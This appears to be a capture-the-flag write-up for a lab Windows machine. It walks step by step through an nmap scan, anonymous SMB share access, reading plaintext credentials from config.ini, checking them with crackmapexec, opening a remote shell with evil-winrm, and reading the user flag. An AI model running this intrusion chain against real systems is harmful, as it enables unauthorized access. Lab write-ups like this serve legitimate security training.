# 3

## Table of Contents
- [Service Discovery](#service-discovery)
- [SMB Enumeration](#smb-enumeration)
- [Accessing the Config Share](#accessing-the-config-share)
- [Retrieving Credentials](#retrieving-credentials)
- [Testing Credentials](#testing-credentials)
- [Remote Access via Evil-WinRM](#remote-access-via-evil-winrm)
- [Host Confirmation & Target Navigation](#host-confirmation--target-navigation)
- [Flag Retrieval](#flag-retrieval)

---

## Service Discovery

**Command:**
```
nmap -sC -sV 10.129.8.60
```

**Result:** SMB service discovered on port `445/tcp`.

> 📸 _Add screenshot of Nmap results_

---

## SMB Enumeration

**Command:**
```
smbclient -L //10.129.8.60 -N
```

Listed available SMB shares on the server without credentials to identify any accessible network shares that might contain useful files or sensitive information.

**Result:** The `Config` SMB share stood out as a target.

> 📸 _Add screenshot of SMB share listing_

---

## Accessing the Config Share

**Command:**
```
smbclient //10.129.8.60/Config -N
```

Connected to the `Config` SMB share without credentials to check for files containing useful information.

**Result:** Found `config.ini` inside the share.

> 📸 _Add screenshot of share contents_

---

## Retrieving Credentials

**Commands:**
```
get config.ini
exit
cat config.ini
```

Retrieved `config.ini` from the share, then read its contents to search for credentials.

**Result:**
| Field | Value |
|-------|-------|
| User | `claudio` |
| Password | `PurpleHaze!` |

> 📸 _Add screenshot of config.ini contents_

---

## Testing Credentials

**Command:**
```
crackmapexec smb 10.129.8.60 -u claudio -p 'PurpleHaze!'
```

Validated the discovered credentials against the target before attempting remote access.

**Result:** Credentials confirmed valid.

> 📸 _Add screenshot of crackmapexec output_

---

## Remote Access via Evil-WinRM

**Command:**
```
evil-winrm -i 10.129.8.60 -u claudio -p 'PurpleHaze!'
```

Used the credentials from `config.ini` to establish a remote PowerShell session on the target machine via Evil-WinRM.

**Result:** Successful connection established.

> 📸 _Add screenshot of Evil-WinRM session_

---

## Host Confirmation & Target Navigation

**Commands:**
```
whoami
cd C:\Users
dir
cat Public
```

Confirmed the current user and navigated through user directories to locate the flag.

**Result:** Access to the `Public` folder was denied — the `claudio` user lacked read permissions.

> 📸 _Add screenshot of access denied output_

---

## Flag Retrieval

**Commands:**
```
cd C:\Users\claudio\Desktop
dir
type user.txt
```

After being denied access to `Public`, navigated to `claudio`'s Desktop where the user flag was located.

**Result:**

```
58e50f904aab05ac687efc1635421d78
```

> 📸 _Add screenshot of flag retrieval_
